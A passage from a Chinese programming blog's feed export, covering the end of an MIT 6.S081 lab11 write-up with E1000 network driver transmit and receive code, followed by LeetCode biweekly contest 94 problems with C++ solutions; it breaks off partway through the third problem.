<li><p><code>packet receive</code>：网卡驱动每次收到报文时，对在队列的 <code>tail</code> 处添加报文的描述符，并同时将 <code>tail</code> 加 <code>1</code>. 网卡硬件每次接收报文时，会直接将报文写 <code>head</code> 处，同时将 <code>head</code> 增加。当 <code>head</code> 等于 <code>tail</code> 时则认为队列为空， 当满足 <code>(head + 1) % size = tail</code> 时，此时队列已满，则会直接将报文进行丢弃。初始化时 <code>head = 0,tail = size - 1</code>。<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202212231654637.png"></p>
</li>
<li><p><code>packet transmit</code>：网卡驱动发送报文时，对在队列的 <code>tail</code> 处添加报文的描述符，并同时将 <code>tail</code> 加 <code>1</code>. 网卡硬件每次接收报文时，会直接直接从 <code>head</code> 处读取描述符并写入网卡发送队列，同时将 <code>head</code> 增加。当 <code>head</code> 等于 <code>tail</code> 时则认为队列为空， 当满足 <code>(head + 1) % size = tail</code> 时，此时队列已满。<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202212232035309.png"></p>
</li>
</ul>
<h4 id="lab11-network"><a href="#lab11-network" class="headerlink" title="lab11 network"></a>lab11 network</h4><p>本节给的 <code>lab</code> 内容看似很复杂，结果实际却写不了几行代码，看着网卡操作手册和 <code>hint</code> 基本上就搞定了，唯一需要注意的是由于每次只能有一个线程使用网卡发送报文，此时我们需要对网卡的缓冲区加锁。在而收取报文时，由于只有一个中断程序来读取报文，所以不需要特别的加锁。当然在实际情况中可能不一样，网卡接受报文和发送报文时可能会有多个队列，实际可能需要针对不同的队列进行加锁。可能会有多个应用程序处理多个队列。</p>
<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Your job is to complete e1000_transmit() and e1000_recv(), both in kernel/e1000.c, so that the driver can transmit and receive packets. You are done when make grade says your solution passes all the tests.</span><br><span class="line"></span><br><span class="line">While writing your code, you&#x27;ll find yourself referring to the E1000 Software Developer&#x27;s Manual. Of particular help may be the following sections:</span><br><span class="line"></span><br><span class="line">Section 2 is essential and gives an overview of the entire device.</span><br><span class="line">Section 3.2 gives an overview of packet receiving.</span><br><span class="line">Section 3.3 gives an overview of packet transmission, alongside section 3.4.</span><br><span class="line">Section 13 gives an overview of the registers used by the E1000.</span><br><span class="line">Section 14 may help you understand the init code that we&#x27;ve provided.</span><br><span class="line">Browse the E1000 Software Developer&#x27;s Manual. This manual covers several closely related Ethernet controllers. QEMU emulates the 82540EM. Skim Chapter 2 now to get a feel for the device. To write your driver, you&#x27;ll need to be familiar with Chapters 3 and 14, as well as 4.1 (though not 4.1&#x27;s subsections). You&#x27;ll also need to use Chapter 13 as a reference. The other chapters mostly cover components of the E1000 that your driver won&#x27;t have to interact with. Don&#x27;t worry about the details at first; just get a feel for how the document is structured so you can find things later. The E1000 has many advanced features, most of which you can ignore. Only a small set of basic features is needed to complete this lab.</span><br><span class="line"></span><br><span class="line">The e1000_init() function we provide you in e1000.c configures the E1000 to read packets to be transmitted from RAM, and to write received packets to RAM. This technique is called DMA, for direct memory access, referring to the fact that the E1000 hardware directly writes and reads packets to/from RAM.</span><br></pre></td></tr></table></figure>
<h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><ul>
<li><p><code>network</code> 中需要实现网卡的报文接收 <code>int e1000_transmit(struct mbuf *m)</code> 与报文发送处理 <code> static void e1000_recv(void)</code>，我们可能需要先阅读一下相关的手册，了解一下基本的关于 <code>Descriptor</code> 的定义，这部分就非常简单了，查看 <code>datasheet</code> 文档即可。题目还给出了 <code>e1000_init</code> 函数的实现，就可以知道关于其初始化的基本流程了。</p>
</li>
<li><p>发送初始化代码:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// Reset the device 关闭终端，并对网卡复位</span></span><br><span class="line">regs[E1000_IMS] = <span class="number">0</span>; <span class="comment">// disable interrupts</span></span><br><span class="line">regs[E1000_CTL] |= E1000_CTL_RST;</span><br><span class="line">regs[E1000_IMS] = <span class="number">0</span>; <span class="comment">// redisable interrupts</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// [E1000 14.5] Transmit initialization</span></span><br><span class="line"><span class="built_in">memset</span>(tx_ring, <span class="number">0</span>, <span class="built_in">sizeof</span>(tx_ring));</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; TX_RING_SIZE; i++) &#123;</span><br><span class="line">  tx_ring[i].status = E1000_TXD_STAT_DD;</span><br><span class="line">  tx_mbufs[i] = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="comment">// 设置每个 ring buffer 的初始化状态</span></span><br><span class="line"><span class="comment">// 设置 ring buffer 的地址</span></span><br><span class="line">regs[E1000_TDBAL] = (uint64) tx_ring;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">sizeof</span>(tx_ring) % <span class="number">128</span> != <span class="number">0</span>)</span><br><span class="line">  <span class="built_in">panic</span>(<span class="string">&quot;e1000&quot;</span>);</span><br><span class="line"><span class="comment">// 设置 ring 的长度 与 队首与队尾的 offset</span></span><br><span class="line">regs[E1000_TDLEN] = <span class="built_in">sizeof</span>(tx_ring);</span><br><span class="line">regs[E1000_TDH] = regs[E1000_TDT] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// [E1000 14.4] Receive initialization</span></span><br><span class="line"><span class="comment">// 初始化接收队列</span></span><br><span class="line"><span class="built_in">memset</span>(rx_ring, <span class="number">0</span>, <span class="built_in">sizeof</span>(rx_ring));</span><br><span class="line"><span class="comment">// 对每个 mbuffer 进行初始化</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; RX_RING_SIZE; i++) &#123;</span><br><span class="line">  rx_mbufs[i] = <span class="built_in">mbufalloc</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (!rx_mbufs[i])</span><br><span class="line">    <span class="built_in">panic</span>(<span class="string">&quot;e1000&quot;</span>);</span><br><span class="line">  rx_ring[i].addr = (uint64) rx_mbufs[i]-&gt;head;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 设置队列的首地址</span></span><br><span class="line">regs[E1000_RDBAL] = (uint64) rx_ring;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">sizeof</span>(rx_ring) % <span class="number">128</span> != <span class="number">0</span>)</span><br><span class="line">  <span class="built_in">panic</span>(<span class="string">&quot;e1000&quot;</span>);</span><br><span class="line"><span class="comment">// 初始化 head tail.</span></span><br><span class="line">regs[E1000_RDH] = <span class="number">0</span>;</span><br><span class="line">regs[E1000_RDT] = RX_RING_SIZE - <span class="number">1</span>;</span><br><span class="line">regs[E1000_RDLEN] = <span class="built_in">sizeof</span>(rx_ring);</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><ol>
<li><code>int e1000_transmit(struct mbuf *m)</code> 将 <code>m</code> 中存储的网络报文发送到网卡中。代码实现非常简单，我们基本上参考 <code>hint</code> 就可以完成。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Some hints for implementing e1000_transmit:</span><br><span class="line"></span><br><span class="line">First ask the E1000 for the TX ring index at which it&#x27;s expecting the next packet, by reading the E1000_TDT control register.</span><br><span class="line">Then check if the the ring is overflowing. If E1000_TXD_STAT_DD is not set in the descriptor indexed by E1000_TDT, the E1000 hasn&#x27;t finished the corresponding previous transmission request, so return an error.</span><br><span class="line">Otherwise, use mbuffree() to free the last mbuf that was transmitted from that descriptor (if there was one).</span><br><span class="line">Then fill in the descriptor. m-&gt;head points to the packet&#x27;s content in memory, and m-&gt;len is the packet length. Set the necessary cmd flags (look at Section 3.3 in the E1000 manual) and stash away a pointer to the mbuf for later freeing.</span><br><span class="line">Finally, update the ring position by adding one to E1000_TDT modulo TX_RING_SIZE.</span><br><span class="line">If e1000_transmit() added the mbuf successfully to the ring, return 0. On failure (e.g., there is no descriptor available to transmit the mbuf), return -1 so that the caller knows to free the mbuf.</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>首先我们发送报文时需要加锁，然后从 <code>regs[E1000_TDT]</code> 中读取队列的尾部指向的 <code>mbuf</code>，并读取上一个 <code>index</code> 对应的报文是否已经完成发送，此时只需要读取 <code>status</code> 即可，并将该 <code>mbuffer</code> 释放，接着在该 <code>ring buffer</code> 处填充发送的描述符的相关信息，比如报文数据的存放地址，长度，以及 <code>CMD</code> 内容，并记录下该 <code>buffer</code>，网卡在进行 <code>dma</code> 操作时会自动读该描述符相关内容并将报文数据拷贝到网卡上，从而完成报文发送。接着将 <code>tail</code> 进行自增，为下一个 <code>slot</code> 作为填充的位置。<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">e1000_transmit</span><span class="params">(<span class="keyword">struct</span> mbuf *m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Your code here.</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// the mbuf contains an ethernet frame; program it into</span></span><br><span class="line">  <span class="comment">// the TX descriptor ring so that the e1000 sends it. Stash</span></span><br><span class="line">  <span class="comment">// a pointer so that it can be freed after sending.</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="built_in">acquire</span>(&amp;e1000_lock);</span><br><span class="line">  uint32 r_index = regs[E1000_TDT];</span><br><span class="line">  <span class="comment">/* check the ring is overflow */</span></span><br><span class="line">  <span class="keyword">if</span> ((tx_ring[r_index].status &amp; E1000_TXD_STAT_DD) == <span class="number">0</span>) &#123;</span><br><span class="line">	 <span class="built_in">release</span>(&amp;e1000_lock);</span><br><span class="line">  	 <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (tx_mbufs[r_index]) &#123;</span><br><span class="line">  	 <span class="built_in">mbuffree</span>(tx_mbufs[r_index]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* fill the tx desciptor */</span></span><br><span class="line">  tx_ring[r_index].addr = (uint64)m-&gt;head;</span><br><span class="line">  tx_ring[r_index].length = (uint16)m-&gt;len;</span><br><span class="line">  tx_ring[r_index].cmd = E1000_TXD_CMD_RS | E1000_TXD_CMD_EOP;</span><br><span class="line">  tx_mbufs[r_index] = m;</span><br><span class="line">  regs[E1000_TDT] = (regs[E1000_TDT] + <span class="number">1</span>) % TX_RING_SIZE;</span><br><span class="line">  <span class="built_in">release</span>(&amp;e1000_lock);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="2">
<li><code>static void e1000_recv(void)</code> 完成报文的收取，根据题意可以知道当发生中断时，<code>driver</code> 会从网卡的缓冲区读取所有可以读取的报文，并将其读到内存中。首先我们找到下一个 <code>index</code>，如果下一个 <code>buffer</code> 的状态为未读则读取报文，否则则停止。直接调用 <code>net_rx</code> 从缓冲区中读取报文，从而完成了协议栈收包并处理，同时为当前的 <code>slot</code> 申请新的内存，并完成填充，并将 <code>tail</code> 进行递增。当然仅仅参考 <code>hint</code> 不用看手册就可以完成。当然网卡处理报文本身就比较复杂。<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">e1000_recv</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Your code here.</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Check for packets that have arrived from the e1000</span></span><br><span class="line">  <span class="comment">// Create and deliver an mbuf for each packet (using net_rx()).</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">	  uint32 r_index = (regs[E1000_RDT] + <span class="number">1</span>) % RX_RING_SIZE;</span><br><span class="line">	  <span class="keyword">if</span> ((rx_ring[r_index].status &amp; E1000_RXD_STAT_DD) == <span class="number">0</span>) &#123;</span><br><span class="line">		 <span class="keyword">return</span>;</span><br><span class="line">	  &#125;</span><br><span class="line">	  rx_mbufs[r_index]-&gt;len = (uint32)rx_ring[r_index].length;</span><br><span class="line">	  <span class="keyword">if</span> (rx_mbufs[r_index]) &#123;</span><br><span class="line">	  	 <span class="built_in">net_rx</span>(rx_mbufs[r_index]);</span><br><span class="line">	  &#125;</span><br><span class="line">	  rx_mbufs[r_index] = <span class="built_in">mbufalloc</span>(<span class="number">0</span>);</span><br><span class="line">	  rx_ring[r_index].addr = (uint64)rx_mbufs[r_index]-&gt;head;</span><br><span class="line">	  rx_ring[r_index].status = <span class="number">0</span>;</span><br><span class="line">	  regs[E1000_RDT] = r_index;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>总的来说这个 <code>lab</code> 还是非常有挑战性的，是个好的 <code>lab</code>，但是 <code>lab</code> 本身的代码倒不是很难，我觉得后面还是有机会仔细做一下 <code>mit6.828</code> 的 <code>lab</code>。我以为完成驱动代码需要非常多的技巧和文档需要阅读，结果代码量实在太少了。</p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://whistle-wind.com/">http://whistle-wind.com/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210080853104.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>MIT6.S081</category>
      </categories>
      <tags>
        <tag>公开课学习</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode biweekly contest 94</title>
    <url>/2022/12/25/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/89/</url>
    <content><![CDATA[<h2 id="leetcode-biweekly-contest-94"><a href="#leetcode-biweekly-contest-94" class="headerlink" title="leetcode biweekly contest 94"></a>leetcode biweekly contest 94</h2><p>第四题就是模板题目，太没什么新意了，第三题时个贪心的数论的题目还算比较有新意的题目。</p>
<p><img src="https://raw.githubusercontent.com/mike-box/pic/main/202212251359326.png" alt="image-20221225135945227"></p>
<h3 id="6273-最多可以摧毁的敌人城堡数目"><a href="#6273-最多可以摧毁的敌人城堡数目" class="headerlink" title="6273. 最多可以摧毁的敌人城堡数目"></a>6273. 最多可以摧毁的敌人城堡数目</h3><p>给你一个长度为 <code>n</code> ，下标从 <strong>0</strong> 开始的整数数组 <code>forts</code> ，表示一些城堡。<code>forts[i]</code> 可以是 <code>-1</code> ，<code>0</code> 或者 <code>1</code> ，其中：</p>
<ul>
<li><code>-1</code> 表示第 <code>i</code> 个位置 <strong>没有</strong> 城堡。</li>
<li><code>0</code> 表示第 <code>i</code> 个位置有一个 <strong>敌人</strong> 的城堡。</li>
<li><code>1</code> 表示第 <code>i</code> 个位置有一个你控制的城堡。</li>
</ul>
<p>现在，你需要决定，将你的军队从某个你控制的城堡位置 <code>i</code> 移动到一个空的位置 <code>j</code> ，满足：</p>
<ul>
<li><code>0 &lt;= i, j &lt;= n - 1</code></li>
<li>军队经过的位置 <strong>只有</strong> 敌人的城堡。正式的，对于所有 <code>min(i,j) &lt; k &lt; max(i,j)</code> 的 <code>k</code> ，都满足 <code>forts[k] == 0</code> 。</li>
</ul>
<p>当军队移动时，所有途中经过的敌人城堡都会被 <strong>摧毁</strong> 。</p>
<p>请你返回 <strong>最多</strong> 可以摧毁的敌人城堡数目。如果 <strong>无法</strong> 移动你的军队，或者没有你控制的城堡，请返回 <code>0</code> 。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：forts = [1,0,0,-1,0,0,0,0,1]</span><br><span class="line">输出：4</span><br><span class="line">解释：</span><br><span class="line">- 将军队从位置 0 移动到位置 3 ，摧毁 2 个敌人城堡，位置分别在 1 和 2 。</span><br><span class="line">- 将军队从位置 8 移动到位置 3 ，摧毁 4 个敌人城堡。</span><br><span class="line">4 是最多可以摧毁的敌人城堡数目，所以我们返回 4 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：forts = [0,0,1,-1]</span><br><span class="line">输出：0</span><br><span class="line">解释：由于无法摧毁敌人的城堡，所以返回 0 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= forts.length &lt;= 1000</code></li>
<li><code>-1 &lt;= forts[i] &lt;= 1</code></li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-94/problems/maximum-enemy-forts-that-can-be-captured/">https://leetcode.cn/contest/biweekly-contest-94/problems/maximum-enemy-forts-that-can-be-captured/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接遍历
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>由于移动方向可以有两种，那么从左到右移动，要么从右向左移动，我们需要找到一段连续的区间，起点为 $1$，终点为 $-1$，且中间的位置全部为 $0$，找到这样的最长的连续区间即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$。其中 $n$ 表示数组的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">captureForts</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; forts)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = forts.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (forts[i] == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (forts[j] == <span class="number">0</span>) &#123;</span><br><span class="line">                        cnt++;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (forts[j] == <span class="number">-1</span>) &#123;</span><br><span class="line">                            ans = <span class="built_in">max</span>(ans, j - i - <span class="number">1</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (forts[i] == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> j = i - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (forts[j] == <span class="number">0</span>) &#123;</span><br><span class="line">                        cnt++;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (forts[j] == <span class="number">-1</span>) &#123;</span><br><span class="line">                            ans = <span class="built_in">max</span>(ans, i - j - <span class="number">1</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6274-奖励最顶尖的-K-名学生"><a href="#6274-奖励最顶尖的-K-名学生" class="headerlink" title="6274. 奖励最顶尖的 K 名学生"></a>6274. 奖励最顶尖的 K 名学生</h3><p>给你两个字符串数组 <code>positive_feedback</code> 和 <code>negative_feedback</code> ，分别包含表示正面的和负面的词汇。<strong>不会</strong> 有单词同时是正面的和负面的。</p>
<p>一开始，每位学生分数为 <code>0</code> 。每个正面的单词会给学生的分数 <strong>加</strong> <code>3</code> 分，每个负面的词会给学生的分数 <strong>减</strong> <code>1</code> 分。</p>
<p>给你 <code>n</code> 个学生的评语，用一个下标从 <strong>0</strong> 开始的字符串数组 <code>report</code> 和一个下标从 <strong>0</strong> 开始的整数数组 <code>student_id</code> 表示，其中 <code>student_id[i]</code> 表示这名学生的 ID ，这名学生的评语是 <code>report[i]</code> 。每名学生的 ID <strong>互不相同</strong>。</p>
<p>给你一个整数 <code>k</code> ，请你返回按照得分 <strong>从高到低</strong> 最顶尖的 <code>k</code> 名学生。如果有多名学生分数相同，ID 越小排名越前。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：positive_feedback = [&quot;smart&quot;,&quot;brilliant&quot;,&quot;studious&quot;], negative_feedback = [&quot;not&quot;], report = [&quot;this student is studious&quot;,&quot;the student is smart&quot;], student_id = [1,2], k = 2</span><br><span class="line">输出：[1,2]</span><br><span class="line">解释：</span><br><span class="line">两名学生都有 1 个正面词汇，都得到 3 分，学生 1 的 ID 更小所以排名更前。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：positive_feedback = [&quot;smart&quot;,&quot;brilliant&quot;,&quot;studious&quot;], negative_feedback = [&quot;not&quot;], report = [&quot;this student is not studious&quot;,&quot;the student is smart&quot;], student_id = [1,2], k = 2</span><br><span class="line">输出：[2,1]</span><br><span class="line">解释：</span><br><span class="line">- ID 为 1 的学生有 1 个正面词汇和 1 个负面词汇，所以得分为 3-1=2 分。</span><br><span class="line">- ID 为 2 的学生有 1 个正面词汇，得分为 3 分。</span><br><span class="line">学生 2 分数更高，所以返回 [2,1] 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= positive_feedback.length, negative_feedback.length &lt;= 104</code></li>
<li><code>1 &lt;= positive_feedback[i].length, negative_feedback[j].length &lt;= 100</code></li>
<li><code>positive_feedback[i]</code> 和 <code>negative_feedback[j]</code> 都只包含小写英文字母。</li>
<li><code>positive_feedback</code> 和 <code>negative_feedback</code> 中不会有相同单词。</li>
<li><code>n == report.length == student_id.length</code></li>
<li><code>1 &lt;= n &lt;= 104</code></li>
<li><code>report[i]</code> 只包含小写英文字母和空格 <code>&#39; &#39;</code> 。</li>
<li><code>report[i]</code> 中连续单词之间有单个空格隔开。</li>
<li><code>1 &lt;= report[i].length &lt;= 100</code></li>
<li><code>1 &lt;= student_id[i] &lt;= 109</code></li>
<li><code>student_id[i]</code> 的值 <strong>互不相同</strong> 。</li>
<li><code>1 &lt;= k &lt;= n</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-94/problems/reward-top-k-students/">https://leetcode.cn/contest/biweekly-contest-94/problems/reward-top-k-students/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>哈希表
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>题目比较简单的哈希映射即可。首先我们对每个单词求出其对应的分数。接着我们遍历每个人对应的报告，并将其报告中的每个单词切割出来，对每个单词求其分数。如果该单词为正面单词，则其得分加上 $3$，如果该单词为负面单词，则其得分减去 $3$，最后求出每个人的总得分，按照题目要求取最大的 $k$ 个得分的 $ID$ 即可。 </li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(nm + n\log n)$，其中 $n$ 为给定的学生的人数，$m$ 表示每个同学的句子的长度。先遍历求出每个学生的得分，然后利用排序求出 $topk$ 即可。</li>
<li>空间复杂度：$O(n)$。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">topStudents</span><span class="params">(vector&lt;string&gt;&amp; positive_feedback, vector&lt;string&gt;&amp; negative_feedback, vector&lt;string&gt;&amp; report, vector&lt;<span class="type">int</span>&gt;&amp; student_id, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = student_id.<span class="built_in">size</span>();</span><br><span class="line">        unordered_set&lt;string&gt; pos, neg;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> w : positive_feedback) &#123;</span><br><span class="line">            pos.<span class="built_in">emplace</span>(w);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> w : negative_feedback) &#123;</span><br><span class="line">            neg.<span class="built_in">emplace</span>(w);</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&gt; arr;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            string s = report[i];</span><br><span class="line">            <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> score = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (j &lt; s.<span class="built_in">size</span>()) &#123;</span><br><span class="line">                string word;</span><br><span class="line">                <span class="keyword">while</span> (j &lt; s.<span class="built_in">size</span>() &amp;&amp; s[j] != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                    word.<span class="built_in">push_back</span>(s[j]);</span><br><span class="line">                    j++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (pos.<span class="built_in">count</span>(word)) &#123;</span><br><span class="line">                    score += <span class="number">3</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (neg.<span class="built_in">count</span>(word)) &#123;</span><br><span class="line">                    score -= <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">while</span> (j &lt; s.<span class="built_in">size</span>() &amp;&amp; s[j] == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                    j++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            arr.<span class="built_in">emplace_back</span>(student_id[i], score);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(arr.<span class="built_in">begin</span>(), arr.<span class="built_in">end</span>(), [](<span class="type">const</span> pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt; &amp;a, <span class="type">const</span> pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt; &amp; b) &#123;</span><br><span class="line">            <span class="keyword">if</span> (a.second == b.second) &#123;</span><br><span class="line">                <span class="keyword">return</span> a.first &lt; b.first;</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">return</span> a.second &gt; b.second;</span><br><span class="line">        &#125;);</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">            res.<span class="built_in">emplace_back</span>(arr[i].first);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6295-最小化两个数组中的最大值"><a href="#6295-最小化两个数组中的最大值" class="headerlink" title="6295. 最小化两个数组中的最大值"></a>6295. 最小化两个数组中的最大值</h3><p>给你两个数组 <code>arr1</code> 和 <code>arr2</code> ，它们一开始都是空的。你需要往它们中添加正整数，使它们满足以下条件：</p>
<ul>
<li><code>arr1</code> 包含 <code>uniqueCnt1</code> 个 <strong>互不相同</strong> 的正整数，每个整数都 <strong>不能</strong> 被 <code>divisor1</code> <strong>整除</strong> 。</li>
<li><code>arr2</code> 包含 <code>uniqueCnt2</code> 个 <strong>互不相同</strong> 的正整数，每个整数都 <strong>不能</strong> 被 <code>divisor2</code> <strong>整除</strong> 。</li>
<li><code>arr1</code> 和 <code>arr2</code> 中的元素 <strong>互不相同</strong> 。</li>
</ul>
<p>给你 <code>divisor1</code> ，<code>divisor2</code> ，<code>uniqueCnt1</code> 和 <code>uniqueCnt2</code> ，请你返回两个数组中 <strong>最大元素</strong> 的 <strong>最小值</strong> 。</p>
<p><strong>示例 1：</strong></p>
